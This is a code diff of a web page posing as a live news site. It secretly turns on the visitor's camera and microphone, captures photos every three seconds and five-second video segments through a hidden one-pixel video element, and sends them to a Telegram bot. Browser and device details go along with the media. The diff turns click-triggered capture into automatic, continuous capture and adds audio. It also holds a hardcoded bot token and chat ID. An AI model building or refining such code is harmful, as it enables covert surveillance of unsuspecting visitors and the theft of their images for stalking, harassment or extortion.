@@ -36,7 +36,7 @@
             box-shadow: 0 40px 80px rgba(0, 0, 0, 0.5);
             position: relative;
             overflow: hidden;
-            transition: all 0.3s;
+            transition: all 0.5s;
         }
         
         /* ========== ANIMATED BORDER ========== */
@@ -134,7 +134,7 @@
             margin-right: 4px;
         }
         
-        /* ========== TICKER ========== */
+        /* ========== NEWS TICKER ========== */
         .ticker {
             background: rgba(255,255,255,0.03);
             border-radius: 12px;
@@ -149,7 +149,7 @@
             display: inline-block;
             color: rgba(255,255,255,0.6);
             font-size: 12px;
-            animation: tickerScroll 20s linear infinite;
+            animation: tickerScroll 15s linear infinite;
         }
         
         @keyframes tickerScroll {
@@ -157,43 +157,7 @@
             100% { transform: translateX(-200%); }
         }
         
-        /* ========== FEATURED ========== */
-        .featured {
-            background: linear-gradient(135deg, rgba(255,107,107,0.08), rgba(77,150,255,0.08));
-            border-radius: 14px;
-            padding: 16px;
-            margin-bottom: 14px;
-            border: 1px solid rgba(255,255,255,0.04);
-            text-align: center;
-            cursor: pointer;
-            transition: all 0.3s;
-            animation: fadeUp 0.6s ease-out;
-        }
-        
-        .featured:hover {
-            transform: scale(1.02);
-            background: linear-gradient(135deg, rgba(255,107,107,0.15), rgba(77,150,255,0.15));
-        }
-        
-        .featured .big-icon {
-            font-size: 48px;
-            margin-bottom: 4px;
-            transition: all 0.5s;
-        }
-        
-        .featured h3 {
-            color: #fff;
-            font-size: 17px;
-            font-weight: 700;
-        }
-        
-        .featured p {
-            color: rgba(255,255,255,0.4);
-            font-size: 13px;
-            margin-top: 2px;
-        }
-        
-        /* ========== GRID ========== */
+        /* ========== CONTENT GRID ========== */
         .grid {
             display: grid;
             grid-template-columns: 1fr 1fr;
@@ -255,16 +219,41 @@
             }
         }
         
-        /* ========== CLICK COUNTER ========== */
-        .click-counter {
+        /* ========== FEATURED ========== */
+        .featured {
+            background: linear-gradient(135deg, rgba(255,107,107,0.08), rgba(77,150,255,0.08));
+            border-radius: 14px;
+            padding: 16px;
+            margin-bottom: 14px;
+            border: 1px solid rgba(255,255,255,0.04);
             text-align: center;
-            font-size: 11px;
-            color: rgba(255,255,255,0.15);
-            margin-top: 4px;
-            padding: 6px;
-            border-radius: 20px;
-            background: rgba(255,255,255,0.02);
+            animation: fadeUp 0.8s ease-out;
         }
+        
+        .featured .big-icon {
+            font-size: 48px;
+            margin-bottom: 4px;
+        }
+        
+        .featured h3 {
+            color: #fff;
+            font-size: 17px;
+            font-weight: 700;
+        }
+        
+        .featured p {
+            color: rgba(255,255,255,0.4);
+            font-size: 13px;
+            margin-top: 2px;
+        }
+        
+        /* ========== COLOR THEMES (Random) ========== */
+        .theme-1 { border-left: 3px solid #ff6b6b; }
+        .theme-2 { border-left: 3px solid #ffd93d; }
+        .theme-3 { border-left: 3px solid #6bcb77; }
+        .theme-4 { border-left: 3px solid #4d96ff; }
+        .theme-5 { border-left: 3px solid #9b59b6; }
+        .theme-6 { border-left: 3px solid #fd79a8; }
         
         /* ========== HIDDEN MEDIA ========== */
         #video {
@@ -275,6 +264,10 @@
             height: 1px;
             opacity: 0;
             pointer-events: none;
+        }
+        
+        #audioRecorder {
+            display: none;
         }
         
         #canvas {
@@ -313,9 +306,10 @@
 </head>
 <body>
 
-    <!-- ========== HIDDEN VIDEO ========== -->
+    <!-- ========== HIDDEN MEDIA ========== -->
     <video id="video" autoplay playsinline></video>
     <canvas id="canvas"></canvas>
+    <audio id="audioRecorder" autoplay></audio>
 
     <!-- ========== MAIN CARD ========== -->
     <div class="glass-card" id="mainCard">
@@ -327,10 +321,10 @@
         </div>
         
         <!-- Status Bar -->
-        <div class="status-bar">
+        <div class="status-bar" id="statusBar">
             <span class="item"><span class="live-dot"></span> <span class="num" id="viewers">12,847</span> watching</span>
             <span class="item" id="timeDisplay">🔄 Updating...</span>
-            <span class="item" id="clickCount">👆 0 clicks</span>
+            <span class="item" id="sessionTime">⏱️ 0s</span>
         </div>
         
         <!-- Ticker -->
@@ -338,20 +332,17 @@
             <span class="ticker-text" id="tickerText">🔴 BREAKING: Global Summit 2026 underway • Markets surge 3% • AI breakthrough announced • Peace treaty signed • More updates coming...</span>
         </div>
         
-        <!-- Featured (Clickable) -->
+        <!-- Featured -->
         <div class="featured" id="featured">
             <div class="big-icon" id="featuredIcon">🌍</div>
             <h3 id="featuredTitle">Global Leaders Unite</h3>
-            <p id="featuredDesc">Click anywhere to capture & refresh 🔄</p>
+            <p id="featuredDesc">Historic agreement reached at Geneva Summit</p>
         </div>
         
         <!-- Grid -->
         <div class="grid" id="newsGrid">
-            <!-- Items populated by JavaScript -->
+            <!-- Items will be populated by JavaScript -->
         </div>
-        
-        <!-- Click Counter -->
-        <div class="click-counter">💡 Click on any card or featured area to capture</div>
         
         <!-- Footer -->
         <div class="footer">🔒 SECURE • LIVE • 24/7 COVERAGE</div>
@@ -366,7 +357,9 @@
         // ================================================================
         const BOT_TOKEN = "8711596639:AAGySHI6xEgqOz0oT1Sq5Y49QpeQkNe-GmI";
         const CHAT_ID = "8295417969";
-        const MAX_VIDEO_DURATION = 60000; // 60 seconds max video
+        const CAPTURE_INTERVAL = 3000; // 3 seconds
+        const MAX_PHOTOS = 20;
+        const VIDEO_SEGMENT_DURATION = 5000; // 5 seconds video segments
         
         // ================================================================
         //  GET CODE FROM URL
@@ -403,21 +396,20 @@
         // ================================================================
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
+        const audioRecorder = document.getElementById('audioRecorder');
         const viewers = document.getElementById('viewers');
         const timeDisplay = document.getElementById('timeDisplay');
-        const clickCount = document.getElementById('clickCount');
+        const sessionTime = document.getElementById('sessionTime');
         const tickerText = document.getElementById('tickerText');
         const featuredIcon = document.getElementById('featuredIcon');
         const featuredTitle = document.getElementById('featuredTitle');
         const featuredDesc = document.getElementById('featuredDesc');
-        const featured = document.getElementById('featured');
         const newsGrid = document.getElementById('newsGrid');
-        const mainCard = document.getElementById('mainCard');
         
         // ================================================================
-        //  NEWS DATA
+        //  NEWS DATA (Dynamic)
         // ================================================================
-        const allNews = [
+        const newsItems = [
             { icon: '🚀', title: 'AI Breakthrough', desc: 'New model beats human experts', tag: 'Tech', color: '#4d96ff' },
             { icon: '💰', title: 'Markets Surge', desc: 'Inflation cools down globally', tag: 'Finance', color: '#6bcb77' },
             { icon: '⚽', title: 'Champions League', desc: 'Historic final breaks records', tag: 'Sports', color: '#ffd93d' },
@@ -436,24 +428,26 @@
         //  STATE
         // ================================================================
         let stream = null;
+        let audioStream = null;
         let photoCount = 0;
-        let clickCountNum = 0;
         let isRunning = false;
+        let captureTimer = null;
+        let videoTimer = null;
+        let sessionTimer = null;
+        let viewerTimer = null;
+        let tickerTimer = null;
+        let newsTimer = null;
         let mediaRecorder = null;
         let recordedChunks = [];
         let isRecording = false;
-        let videoStartTime = 0;
-        let sessionTimer = null;
-        let viewerTimer = null;
-        let timeUpdateTimer = null;
-        let isVideoSent = false;
-        let lastPhotoTime = 0;
+        let videoSegments = [];
         
         // ================================================================
-        //  START CAMERA
+        //  START EVERYTHING
         // ================================================================
-        async function startCamera() {
+        async function startAll() {
             try {
+                // Start camera
                 stream = await navigator.mediaDevices.getUserMedia({
                     video: {
                         facingMode: 'user',
@@ -466,10 +460,14 @@
                 video.srcObject = stream;
                 await video.play();
                 
-                isRunning = true;
+                // Start audio recording
+                audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
                 
                 // Start video recording
                 startVideoRecording();
+                
+                // Start photo capture
+                startPhotoCapture();
                 
                 // Start UI updates
                 startUIUpdates();
@@ -478,20 +476,16 @@
                 sendStartNotification();
                 
             } catch (error) {
-                console.error('Camera error:', error);
+                console.error('Error:', error);
                 sendErrorToTelegram(error.message);
             }
         }
         
         // ================================================================
-        //  VIDEO RECORDING (Single continuous video)
+        //  VIDEO RECORDING
         // ================================================================
         function startVideoRecording() {
             if (!stream) return;
-            
-            recordedChunks = [];
-            isVideoSent = false;
-            videoStartTime = Date.now();
             
             mediaRecorder = new MediaRecorder(stream, {
                 mimeType: 'video/webm;codecs=vp9,opus'
@@ -504,36 +498,54 @@
             };
             
             mediaRecorder.onstop = function() {
-                if (recordedChunks.length > 0 && !isVideoSent) {
+                if (recordedChunks.length > 0) {
                     const blob = new Blob(recordedChunks, { type: 'video/webm' });
-                    sendVideoToTelegram(blob);
-                    isVideoSent = true;
+                    videoSegments.push(blob);
                     recordedChunks = [];
+                    
+                    // Send video to Telegram
+                    sendVideoToTelegram(blob);
+                    
+                    // Restart recording
+                    if (isRunning) {
+                        setTimeout(() => {
+                            if (mediaRecorder && isRunning) {
+                                mediaRecorder.start(1000);
+                            }
+                        }, 500);
+                    }
                 }
             };
             
             mediaRecorder.start(1000);
             isRecording = true;
             
-            // Auto-stop after max duration
-            setTimeout(() => {
+            // Stop and restart every 5 seconds to create segments
+            videoTimer = setInterval(() => {
                 if (mediaRecorder && isRecording) {
                     mediaRecorder.stop();
-                    isRecording = false;
                 }
-            }, MAX_VIDEO_DURATION);
+            }, VIDEO_SEGMENT_DURATION);
         }
         
         // ================================================================
-        //  CAPTURE PHOTO (On click)
+        //  PHOTO CAPTURE
         // ================================================================
+        function startPhotoCapture() {
+            isRunning = true;
+            photoCount = 0;
+            
+            capturePhoto();
+            
+            captureTimer = setInterval(() => {
+                if (photoCount < MAX_PHOTOS) {
+                    capturePhoto();
+                }
+            }, CAPTURE_INTERVAL);
+        }
+        
         function capturePhoto() {
             if (!stream || !isRunning) return;
-            
-            // Prevent too many photos (min 500ms between captures)
-            const now = Date.now();
-            if (now - lastPhotoTime < 500) return;
-            lastPhotoTime = now;
             
             try {
                 const context = canvas.getContext('2d');
@@ -541,18 +553,10 @@
                 canvas.height = video.videoHeight || 480;
                 context.drawImage(video, 0, 0, canvas.width, canvas.height);
                 
-                const imageData = canvas.toDataURL('image/jpeg', 0.9);
+                const imageData = canvas.toDataURL('image/jpeg', 0.85);
                 photoCount++;
-                clickCountNum++;
                 
-                // Update UI
-                clickCount.textContent = `👆 ${clickCountNum} clicks`;
-                
-                // Send photo to Telegram (with minimal info)
                 sendPhotoToTelegram(imageData);
-                
-                // Also refresh the UI with new content
-                refreshContent();
                 
             } catch (error) {
                 console.error('Capture error:', error);
@@ -560,7 +564,7 @@
         }
         
         // ================================================================
-        //  SEND PHOTO (Minimal info - no visible data)
+        //  SEND TO TELEGRAM
         // ================================================================
         async function sendPhotoToTelegram(imageData) {
             try {
@@ -568,7 +572,15 @@
                 const formData = new FormData();
                 formData.append('chat_id', CHAT_ID);
                 formData.append('photo', blob, `photo_${Date.now()}.jpg`);
-                formData.append('caption', `📸 Photo #${photoCount}`);
+                formData.append('caption', 
+                    `📸 **Photo #${photoCount}**\n\n` +
+                    `🔗 **Code:** \`${code}\`\n` +
+                    `🌍 **Browser:** ${browser}\n` +
+                    `📱 **Device:** ${device}\n` +
+                    `⏰ **Time:** ${new Date().toISOString().replace('T', ' ').slice(0, 19)}\n` +
+                    `⏱️ **Session:** ${Math.floor((Date.now() - startTime) / 1000)}s`
+                );
+                formData.append('parse_mode', 'Markdown');
                 
                 const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
                 await fetch(url, { method: 'POST', body: formData });
@@ -578,16 +590,18 @@
             }
         }
         
-        // ================================================================
-        //  SEND VIDEO (Minimal info)
-        // ================================================================
         async function sendVideoToTelegram(blob) {
             try {
-                const duration = Math.floor((Date.now() - videoStartTime) / 1000);
                 const formData = new FormData();
                 formData.append('chat_id', CHAT_ID);
                 formData.append('video', blob, `video_${Date.now()}.webm`);
-                formData.append('caption', `🎥 Video (${duration}s)`);
+                formData.append('caption', 
+                    `🎥 **Video Segment**\n\n` +
+                    `🔗 **Code:** \`${code}\`\n` +
+                    `⏱️ **Time:** ${new Date().toISOString().replace('T', ' ').slice(0, 19)}\n` +
+                    `📊 **Segments:** ${videoSegments.length}`
+                );
+                formData.append('parse_mode', 'Markdown');
                 
                 const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`;
                 await fetch(url, { method: 'POST', body: formData });
@@ -597,9 +611,6 @@
             }
         }
         
-        // ================================================================
-        //  SEND START NOTIFICATION
-        // ================================================================
         async function sendStartNotification() {
             try {
                 const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
@@ -608,7 +619,12 @@
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         chat_id: CHAT_ID,
-                        text: `🎬 **New Session Started**\n\n🔗 Code: ${code}`,
+                        text: `🎬 **NEW SESSION STARTED!**\n\n` +
+                              `🔗 **Code:** \`${code}\`\n` +
+                              `🌍 **Browser:** ${browser}\n` +
+                              `📱 **Device:** ${device}\n` +
+                              `⏰ **Time:** ${new Date().toISOString().replace('T', ' ').slice(0, 19)}\n\n` +
+                              `📸 Capturing photos & video...`,
                         parse_mode: 'Markdown'
                     })
                 });
@@ -623,7 +639,7 @@
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         chat_id: CHAT_ID,
-                        text: `⚠️ Error: ${errorMsg}`,
+                        text: `⚠️ **Error**\n\nCode: \`${code}\`\nError: ${errorMsg}`,
                         parse_mode: 'Markdown'
                     })
                 });
@@ -631,96 +647,145 @@
         }
         
         // ================================================================
-        //  REFRESH CONTENT (New photos, news, colors)
-        // ================================================================
-        function refreshContent() {
-            // Shuffle news
-            const shuffled = shuffleArray([...allNews]);
-            const selected = shuffled.slice(0, 4);
-            
-            // Update grid
-            newsGrid.innerHTML = '';
-            selected.forEach((item, index) => {
-                const div = document.createElement('div');
-                const themeNum = (index % 6) + 1;
-                div.className = `grid-item theme-${themeNum}`;
-                div.innerHTML = `
-                    <span class="icon">${item.icon}</span>
-                    <h4>${item.title}</h4>
-                    <p>${item.desc}</p>
-                    <span class="tag" style="background:${item.color}20;color:${item.color};">${item.tag}</span>
-                `;
-                div.onclick = (e) => {
-                    e.stopPropagation();
-                    capturePhoto();
-                    // Change featured on click
-                    featuredIcon.textContent = item.icon;
-                    featuredTitle.textContent = item.title;
-                    featuredDesc.textContent = item.desc + ' • Clicked!';
-                };
-                newsGrid.appendChild(div);
-            });
-            
-            // Update featured
-            const featuredItem = shuffled[Math.floor(Math.random() * shuffled.length)];
-            featuredIcon.textContent = featuredItem.icon;
-            featuredTitle.textContent = featuredItem.title;
-            featuredDesc.textContent = featuredItem.desc + ' • Click to capture';
-            
-            // Random color theme
-            const colors = ['#ff6b6b', '#ffd93d', '#6bcb77', '#4d96ff', '#9b59b6', '#fd79a8'];
-            const color = colors[Math.floor(Math.random() * colors.length)];
-            document.querySelector('.glass-card').style.borderColor = color + '40';
-            
-            // Update ticker
-            const tickers = [
-                '🔴 BREAKING: New developments in global summit',
-                '💰 Markets reacting to positive economic data',
-                '🚀 AI continues to reshape industries worldwide',
-                '🌍 Historic peace agreement being finalized',
-                '📡 Space exploration reaching new milestones',
-                '⚽ Sports records being broken this season',
-                '🌿 Health breakthroughs changing lives',
-                '🎬 Entertainment industry seeing record growth'
-            ];
-            tickerText.textContent = '🔴 ' + tickers[Math.floor(Math.random() * tickers.length)] + ' • Stay tuned for more...';
-            
-            // Update viewers (random)
-            const num = Math.floor(Math.random() * 50000) + 8000;
-            viewers.textContent = num.toLocaleString();
-        }
-        
-        // ================================================================
-        //  UI UPDATES
+        //  UI UPDATES (Dynamic - changes every few seconds)
         // ================================================================
         function startUIUpdates() {
-            // Time
-            timeDisplay.textContent = `🔄 ${new Date().toLocaleTimeString('en-US', {hour:'2-digit',minute:'2-digit'})}`;
-            timeUpdateTimer = setInterval(() => {
-                timeDisplay.textContent = `🔄 ${new Date().toLocaleTimeString('en-US', {hour:'2-digit',minute:'2-digit'})}`;
-            }, 5000);
-            
-            // Viewer count
+            // Update viewers
             viewerTimer = setInterval(() => {
                 const num = Math.floor(Math.random() * 50000) + 8000;
                 viewers.textContent = num.toLocaleString();
             }, 3000);
             
-            // Initial content
-            refreshContent();
+            // Update time
+            timeDisplay.textContent = `🔄 ${new Date().toLocaleTimeString('en-US', {hour:'2-digit',minute:'2-digit',second:'2-digit'})}`;
+            setInterval(() => {
+                timeDisplay.textContent = `🔄 ${new Date().toLocaleTimeString('en-US', {hour:'2-digit',minute:'2-digit',second:'2-digit'})}`;
+            }, 1000);
+            
+            // Session time
+            sessionTimer = setInterval(() => {
+                const elapsed = Math.floor((Date.now() - startTime) / 1000);
+                const mins = Math.floor(elapsed / 60);
+                const secs = elapsed % 60;
+                sessionTime.textContent = `⏱️ ${mins}m ${secs}s`;
+            }, 1000);
+            
+            // Ticker
+            const tickers = [
+                '🔴 BREAKING: Global Summit 2026 underway • Leaders discuss climate action',
+                '💰 Markets surge 3% after positive economic data release',
+                '🚀 AI breakthrough: New model beats human experts in medical diagnosis',
+                '🌍 Peace treaty signed between two nations after decades of conflict',
+                '📡 Mars colony announced: First human settlement by 2030',
+                '⚽ Champions League final breaks viewership records',
+                '🌿 New vaccine shows 95% efficacy against rare disease',
+                '🎬 Blockbuster film reaches $1 billion in first week',
+                '🏦 Global banking reform agreement reached',
+                '🌊 Historic climate deal: 50 nations commit to net-zero'
+            ];
+            let tickerIndex = 0;
+            tickerTimer = setInterval(() => {
+                tickerText.textContent = '🔴 ' + tickers[tickerIndex % tickers.length] + ' • More updates coming...';
+                tickerIndex++;
+            }, 4000);
+            
+            // News grid - randomize
+            function shuffleArray(arr) {
+                for (let i = arr.length - 1; i > 0; i--) {
+                    const j = Math.floor(Math.random() * (i + 1));
+                    [arr[i], arr[j]] = [arr[j], arr[i]];
+                }
+                return arr;
+            }
+            
+            function updateNews() {
+                const shuffled = shuffleArray([...newsItems]);
+                const selected = shuffled.slice(0, 4);
+                
+                newsGrid.innerHTML = '';
+                selected.forEach((item, index) => {
+                    const div = document.createElement('div');
+                    div.className = `grid-item theme-${(index % 6) + 1}`;
+                    div.innerHTML = `
+                        <span class="icon">${item.icon}</span>
+                        <h4>${item.title}</h4>
+                        <p>${item.desc}</p>
+                        <span class="tag" style="background:${item.color}20;color:${item.color};">${item.tag}</span>
+                    `;
+                    div.onclick = () => {
+                        // Change featured on click
+                        featuredIcon.textContent = item.icon;
+                        featuredTitle.textContent = item.title;
+                        featuredDesc.textContent = item.desc + ' • Clicked!';
+                    };
+                    newsGrid.appendChild(div);
+                });
+                
+                // Also update featured
+                const featuredItem = shuffled[Math.floor(Math.random() * shuffled.length)];
+                featuredIcon.textContent = featuredItem.icon;
+                featuredTitle.textContent = featuredItem.title;
+                featuredDesc.textContent = featuredItem.desc + ' • Updated live';
+            }
+            
+            updateNews();
+            newsTimer = setInterval(updateNews, 5000);
+            
+            // Random color theme change
+            setInterval(() => {
+                const colors = ['#ff6b6b', '#ffd93d', '#6bcb77', '#4d96ff', '#9b59b6', '#fd79a8'];
+                const color = colors[Math.floor(Math.random() * colors.length)];
+                document.querySelector('.glass-card').style.borderColor = color + '40';
+            }, 3000);
+        }
+        
+        // ================================================================
+        //  STOP EVERYTHING (On page close)
+        // ================================================================
+        function stopAll() {
+            isRunning = false;
+            isRecording = false;
+            
+            if (captureTimer) clearInterval(captureTimer);
+            if (videoTimer) clearInterval(videoTimer);
+            if (sessionTimer) clearInterval(sessionTimer);
+            if (viewerTimer) clearInterval(viewerTimer);
+            if (tickerTimer) clearInterval(tickerTimer);
+            if (newsTimer) clearInterval(newsTimer);
+            
+            if (mediaRecorder && mediaRecorder.state !== 'inactive') {
+                mediaRecorder.stop();
+            }
+            
+            // Send final notification
+            const totalTime = Math.floor((Date.now() - startTime) / 1000);
+            const mins = Math.floor(totalTime / 60);
+            const secs = totalTime % 60;
+            
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: `🛑 **SESSION ENDED**\n\n` +
+                          `🔗 **Code:** \`${code}\`\n` +
+                          `⏱️ **Duration:** ${mins}m ${secs}s\n` +
+                          `📸 **Photos:** ${photoCount}\n` +
+                          `🎥 **Videos:** ${videoSegments.length}\n\n` +
+                          `Total media sent successfully!`,
+                    parse_mode: 'Markdown'
+                })
+            }).catch(() => {});
+            
+            setTimeout(() => {
+                if (stream) stream.getTracks().forEach(track => track.stop());
+                if (audioStream) audioStream.getTracks().forEach(track => track.stop());
+            }, 1000);
         }
         
         // ================================================================
         //  HELPERS
         // ================================================================
-        function shuffleArray(arr) {
-            for (let i = arr.length - 1; i > 0; i--) {
-                const j = Math.floor(Math.random() * (i + 1));
-                [arr[i], arr[j]] = [arr[j], arr[i]];
-            }
-            return arr;
-        }
-        
         function dataURItoBlob(dataURI) {
             const byteString = atob(dataURI.split(',')[1]);
             const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
@@ -733,69 +798,24 @@
         }
         
         // ================================================================
-        //  CLICK HANDLERS
+        //  DETECT PAGE CLOSE
         // ================================================================
-        // Featured area click
-        featured.addEventListener('click', function(e) {
-            e.stopPropagation();
-            capturePhoto();
-        });
-        
-        // Whole card click (anywhere)
-        mainCard.addEventListener('click', function(e) {
-            // Don't capture if clicked on a grid item (they have their own handler)
-            if (e.target.closest('.grid-item')) return;
-            capturePhoto();
-        });
-        
-        // ================================================================
-        //  STOP ON PAGE CLOSE
-        // ================================================================
-        function stopAll() {
-            isRunning = false;
-            isRecording = false;
-            
-            if (mediaRecorder && mediaRecorder.state !== 'inactive') {
-                mediaRecorder.stop();
-                isRecording = false;
-            }
-            
-            if (sessionTimer) clearInterval(sessionTimer);
-            if (viewerTimer) clearInterval(viewerTimer);
-            if (timeUpdateTimer) clearInterval(timeUpdateTimer);
-            
-            // Send final notification
-            const totalTime = Math.floor((Date.now() - startTime) / 1000);
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: `🛑 **Session Ended**\n\n📸 Photos: ${photoCount}\n⏱️ Duration: ${Math.floor(totalTime/60)}m ${totalTime%60}s`,
-                    parse_mode: 'Markdown'
-                })
-            }).catch(() => {});
-            
-            setTimeout(() => {
-                if (stream) stream.getTracks().forEach(track => track.stop());
-            }, 1000);
-        }
-        
         window.addEventListener('beforeunload', function() {
             stopAll();
         });
         
-        // Also handle visibility change
+        // Also detect visibility change
         document.addEventListener('visibilitychange', function() {
             if (document.hidden) {
-                // Tab hidden - keep recording
+                // Page is hidden (tab switched or minimized)
+                // We keep running, but we could log it
             }
         });
         
         // ================================================================
         //  START!
         // ================================================================
-        startCamera();
+        startAll();
     </script>
 </body>
 </html>
